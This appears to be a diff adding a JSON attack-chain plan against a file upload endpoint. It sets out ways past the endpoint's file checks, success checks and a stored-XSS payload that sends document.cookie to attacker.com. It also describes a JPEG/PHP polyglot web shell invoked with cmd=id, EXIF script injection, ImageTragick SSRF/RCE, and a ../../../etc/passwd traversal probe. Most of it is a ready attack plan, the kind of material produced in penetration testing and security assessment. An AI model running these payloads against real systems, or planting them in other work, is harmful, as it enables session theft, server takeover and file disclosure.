@@ -1,0 +1,50 @@
+{
+  "endpoint": "POST /api/v1/documents/upload",
+  "storage_backend": "local_disk",
+  "served_path": "/documents/<id>/<original_filename>",
+  "mime_enforcement": "content_type_header_only",
+  "post_processing": [
+    "ImageMagick thumbnail generation (thumb.jpg created after upload, status: processing → ready)"
+  ],
+  "chain_steps": [
+    {
+      "step": 1,
+      "technique": "svg_xss",
+      "request_mutation": "Upload filename='payload.svg' with Content-Type: image/svg+xml. File content: <svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://attacker.com/?c='+document.cookie)</script></svg>",
+      "gate_to_pass": "Extension .svg not in blocklist (.php, .jsp, .sh only); Content-Type: image/svg+xml accepted by image/* allowlist; file served inline without Content-Disposition: attachment",
+      "next_step_requires": "Victim must open /documents/<id>/payload.svg in browser — script executes in app.example.com origin context",
+      "exploit_value": "critical",
+      "cwe": "CWE-79"
+    },
+    {
+      "step": 2,
+      "technique": "metadata_injection",
+      "request_mutation": "Upload a valid JPEG with EXIF comment field set to: <script>alert(document.domain)</script>. If thumbnail generation embeds EXIF data in output, XSS fires when thumb.jpg is rendered as HTML by a vulnerable viewer.",
+      "gate_to_pass": "ImageMagick may copy EXIF metadata into generated thumbnail; server does not strip metadata before serving",
+      "next_step_requires": "Thumbnail must be opened by a component that renders EXIF as HTML (PDF viewer, metadata display panel, or admin dashboard showing file properties)",
+      "exploit_value": "medium",
+      "cwe": "CWE-116"
+    },
+    {
+      "step": 3,
+      "technique": "polyglot_file",
+      "request_mutation": "Create a file that is simultaneously valid JPEG (magic bytes FF D8 FF) and contains a PHP web shell appended after JPEG EOF (FF D9) marker. Upload with filename='shell.php.jpg' and Content-Type: image/jpeg.",
+      "gate_to_pass": "Extension check only validates last extension (.jpg passes). Content-Type: image/jpeg accepted. Magic byte check (if any) satisfied by JPEG header. If PHP interpreter is configured for .php.jpg or aliases exist, shell executes.",
+      "next_step_requires": "Web server must execute .php.jpg as PHP — requires misconfigured AddHandler or FilesMatch directive. Confirm by requesting /documents/<id>/shell.php.jpg and checking for PHP execution.",
+      "exploit_value": "critical",
+      "cwe": "CWE-434"
+    }
+  ],
+  "execution_surfaces": [
+    "ImageMagick thumbnail generation — vulnerable to CVE-2016-3714 (ImageTragick) on unpatched versions; SVG/PDF inputs to ImageMagick can achieve SSRF or RCE",
+    "Local disk with direct path serving — if .htaccess upload is possible, PHP execution via AddType directive"
+  ],
+  "path_traversal_risk": "medium",
+  "path_traversal_note": "Filename preserved in URL (/documents/<id>/<filename>) but id prefix likely prevents directory escape. Test filename='../../../etc/passwd' — if server strips path separators, risk is low; if not, local file read possible.",
+  "stop_conditions": [
+    "SVG XSS: request /documents/<id>/payload.svg in browser — if script tag in response body is served with Content-Type: image/svg+xml, payload executes in app.example.com origin",
+    "ImageMagick RCE (ImageTragick): upload SVG referencing file:///etc/passwd as image href — if thumbnail generation fetches the file, contents appear in thumb.jpg EXIF",
+    "PHP polyglot: GET /documents/<id>/shell.php.jpg?cmd=id — if response contains 'uid=' then PHP execution is confirmed"
+  ],
+  "summary": "SVG upload bypasses extension blocklist and inline serving enables stored XSS in app.example.com origin; ImageMagick post-processing creates secondary RCE/SSRF surface via ImageTragick"
+}
